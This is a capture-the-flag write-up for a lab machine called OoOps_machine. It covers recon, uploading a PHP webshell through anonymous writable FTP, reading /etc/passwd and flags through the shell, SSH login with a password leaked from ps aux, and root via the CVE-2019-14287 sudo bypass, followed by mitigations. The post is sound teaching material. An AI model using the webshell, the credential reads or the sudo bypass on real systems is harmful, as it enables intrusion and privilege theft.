---
layout: post
title: "OoOps_machine — TFM CTF"
description: "Anonymous FTP con acceso de escritura al webroot, webshell PHP y escalada de privilegios via CVE-2019-14287 (sudo UID -1 bypass)."
categories: [machines]
tags: [tfm, ctf, ftp, webshell, privesc, sudo, cve-2019-14287, docker]
---

## Recon

Starting with a full TCP port scan:

```bash
nmap -p- --open -sT -T3 -v -n TARGET_IP
```

> `-p-` scans all 65535 ports. `-sT` does a full TCP connect scan — used here instead of `-sS` (SYN scan) because SYN requires root privileges to send raw packets. `--open` filters out closed and filtered ports. `-v` shows open ports in real time as they are found.

Four ports open: 21, 22, 80, 8080.

Targeted version and NSE script scan on those:

```bash
nmap -sC -sV -p 21,22,80,8080 TARGET_IP
```

- **Port 21 — FTP (vsFTPd 3.0.3):** The `ftp-anon` NSE script detects **anonymous login allowed**. Directory `html` listed with `drwxrwxrwx` permissions — world-writable. Worth investigating.
- **Port 22 — SSH (OpenSSH 7.6p1, Ubuntu 18.04)**
- **Port 80 — HTTP (Apache 2.4.66 Debian):** Default Apache page.
- **Port 8080 — HTTP (Apache 2.4.29 Ubuntu):** Title "Prueba de PHP".

---

## Enumeration

### Directory fuzzing

```bash
gobuster dir -u http://TARGET_IP:80  -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt
gobuster dir -u http://TARGET_IP:8080 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt
```

> `-t 50` sets 50 concurrent threads. `-x` appends each extension to every wordlist entry, widening coverage.

**Port 80:** `index.html`, `index.php`, `db.php`, `news.php`, `server-status` (Apache `mod_status` exposed without authentication — leaks server internals), and `test.php` (78 KB).

**Port 8080:** just `index.php`, returning the message *"Soy la maquina OoOps machine. Parece que quieres jugar..."*

`test.php` on port 80 turns out to be a live `phpinfo()` output — it exposes PHP version, loaded modules, system paths, and environment variables. This file should never exist in a production environment. Useful for reconnaissance though.

### FTP — verifying anonymous write access

nmap already flagged anonymous FTP with a writable directory called `html`. Testing it manually:

```bash
ftp TARGET_IP
# user: anonymous
# password: (empty, just press Enter)
cd html
put test.txt
bye
```

Checking in a browser: `http://TARGET_IP:8080/test.txt` — the file is served directly. The FTP `html` directory **is the Apache document root for port 8080**. Anything uploaded via FTP is immediately accessible through the web server.

---

## Exploitation

This is the key finding: anonymous FTP with write access maps directly to the web root. Uploading a PHP webshell means the web server will execute it.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
ftp TARGET_IP
# anonymous login, empty password
cd html
put shell.php
bye
```

Verifying execution:

```bash
curl "http://TARGET_IP:8080/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed as `www-data`. Enumerating the filesystem:

```bash
curl "http://TARGET_IP:8080/shell.php?cmd=cat+/etc/passwd" | grep bash
curl "http://TARGET_IP:8080/shell.php?cmd=find+/home+-name+flag*+2>/dev/null"
curl "http://TARGET_IP:8080/shell.php?cmd=cat+/home/hacker/flag.txt"
```

`/etc/passwd` reveals a user called `hacker` (UID 1000). The flag is at `/home/hacker/flag.txt` with `-rw-r--r--` permissions — readable by all users on the system, including `www-data`.

> This matches the CTF hint: *"you access as one user, but the flag belongs to another"*.

```
Flag: 244cdf401e667cca77b8228066096985
```

---

## Privilege Escalation

### Leaking credentials via process list

```bash
curl "http://TARGET_IP:8080/shell.php?cmd=ps+aux"
```

One line stands out:

```
root  60  /bin/bash ./myhacker.sh tefeme_86_pass
```

A script running as root with a **plaintext password passed as a command-line argument**. Any user on the system can read this through `ps aux` or directly from `/proc/[pid]/cmdline` — CWE-214.

### SSH as `hacker`

```bash
ssh hacker@TARGET_IP
# password: tefeme_86_pass
```

It works. The password from the root script is reused as the user account password.

```bash
sudo -l
# User hacker may run (ALL, !root) ALL
```

### CVE-2019-14287 — sudo UID -1 bypass

The rule `(ALL, !root) ALL` looks like it blocks running commands as root. It does not.

When you pass `-1` to `sudo -u#`, sudo's internal conversion maps it to UID `0` — root. The `!root` check only compares the username string, not the resolved UID. Reported by Joe Vennix (Apple), October 2019. CVSS 8.8 (High). Affects sudo < 1.8.28.

```bash
sudo -u#-1 /bin/bash
whoami   # root
cat /root/flag.txt
```

```
Flag: 648d390c021ce7cfde2f95ea3fcd71ec
```

---

## Vulnerability Summary

| ID | Vulnerability | CWE | CVSS v3.1 |
|---|---|---|---|
| V1 | Anonymous FTP with write access to webroot | CWE-276 | — |
| V2 | `phpinfo()` exposed in production | CWE-200 | — |
| V3 | `mod_status` accessible without authentication | CWE-200 | 5.3 |
| V4 | Credentials passed as process argument | CWE-214 | 5.5 |
| V5 | CVE-2019-14287 — `sudo` bypass via UID -1 | CWE-755 | 8.8 |

---

## Mitigations

**V1 — Anonymous FTP:** Set `anonymous_enable=NO` in `/etc/vsftpd.conf`. Keep FTP root and web root on separate paths.

**V2 — `phpinfo()` in production:** Delete `test.php`. Diagnostic files belong in dev only.

**V3 — `mod_status` exposed:**
```apache
<Location "/server-status">
    Require ip 127.0.0.1
</Location>
```

**V4 — Credentials in process arguments:** Use environment variables or files with `chmod 600` instead.

**V5 — CVE-2019-14287:** Update sudo to ≥ 1.8.28. Replace exclusion rules with explicit allowed commands.
